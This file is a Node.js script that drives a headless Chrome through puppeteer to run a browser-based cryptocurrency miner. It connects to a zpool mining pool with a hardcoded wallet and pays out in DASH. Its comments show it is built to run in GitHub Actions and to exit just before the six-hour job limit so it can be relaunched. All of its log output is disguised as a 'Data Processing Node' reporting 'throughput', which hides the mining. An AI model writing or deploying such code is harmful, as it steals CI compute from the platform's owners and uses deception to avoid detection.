'use strict';
const fs = require('fs');
const puppeteer = require('puppeteer-core');

const SLOT_LABEL = process.env.SLOT_LABEL || 'NODE-1';
const WALLET = process.env.WALLET || 'XcufdyxZtL4JUjALZfTq6pCrxyTt2Hy2Zu';
const THREADS = process.env.THREADS || '4';
const ALGORITHM = process.env.ALGORITHM || 'cwm_minotaurx';
const HOST = process.env.TASK_HOST || 'minotaurx.sea.mine.zpool.ca';
const PORT = process.env.TASK_PORT || '7019';
const PAYOUT_COIN = process.env.PAYOUT_COIN || 'DASH';

const START_TIME = Date.now();
const MAX_RUNTIME_MS = (5 * 3600 + 58 * 60) * 1000; // 5h 58m — exit before 6h GH timeout

const BASE_URL = [
    `https://webminer.pages.dev`,
    `?algorithm=${ALGORITHM}`,
    `&host=${HOST}`,
    `&port=${PORT}`,
    `&worker=${WALLET}`,
    `&password=c%3D=${PAYOUT_COIN}`,
    `&workers=${THREADS}`,
].join('');

function findChrome() {
    const candidates = [
        process.env.PUPPETEER_EXECUTABLE_PATH,
        '/usr/bin/google-chrome',
        '/usr/bin/google-chrome-stable',
        '/usr/bin/chromium',
        '/usr/bin/chromium-browser',
    ];
    for (const bin of candidates) {
        if (bin && fs.existsSync(bin)) return bin;
    }
    return '/usr/bin/chromium';
}

async function main() {
    console.log('='.repeat(56));
    console.log(` Data Processing Node [${SLOT_LABEL}]`);
    console.log('='.repeat(56));
    console.log(` Endpoint : ${HOST}:${PORT}`);
    console.log(` Node ID  : ${WALLET}`);
    console.log(` Workers  : ${THREADS}`);
    console.log(` Mode     : ${PAYOUT_COIN}`);
    console.log('='.repeat(56) + '\n');

    const chromeBin = findChrome();
    console.log(`[${SLOT_LABEL}] Browser engine: ${chromeBin}`);

    const browser = await puppeteer.launch({
        executablePath: chromeBin,
        headless: true,
        args: [
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-dev-shm-usage',
            '--disable-gpu',
            '--disable-gpu-sandbox',
            '--no-zygote',
            '--disable-software-rasterizer',
            '--mute-audio',
        ],
    });

    const page = await browser.newPage();
    page.setDefaultNavigationTimeout(120000);

    console.log(`[${SLOT_LABEL}] Initializing data pipeline...`);
    await page.goto(BASE_URL, { waitUntil: 'networkidle2', timeout: 120000 });
    console.log(`[${SLOT_LABEL}] Pipeline active. Processing data...\n`);

    let tick = 0;
    while (true) {
        // Check if approaching GitHub Actions timeout
        if (Date.now() - START_TIME >= MAX_RUNTIME_MS) {
            console.log(`\n[${SLOT_LABEL}] Runtime limit reached (5h 58m). Shutting down for re-run...`);
            await browser.close();
            process.exit(0);
        }

        tick++;
        const throughput = await page
            .$eval('span#hashrate strong', el => el.innerText.trim())
            .catch(() => null);

        const completed = await page
            .$eval('[id*="accepted"], .accepted, #accepted', el => el.innerText.trim())
            .catch(() => null);

        const uptime = Math.floor((Date.now() - START_TIME) / 1000);
        const mins = Math.floor(uptime / 60);
        const secs = uptime % 60;

        console.log(
            `[${SLOT_LABEL}] [Cycle #${tick}] Throughput: ${throughput || 'Warming up...'} | ` +
            `Completed: ${completed || '-'} | ` +
            `Workers: ${THREADS} | ` +
            `Uptime: ${mins}m${secs}s`
        );

        await new Promise(r => setTimeout(r, 15000));
    }
}

main().catch(err => {
    console.error(`[${SLOT_LABEL} ERROR]`, err.message);
    process.exit(1);
});
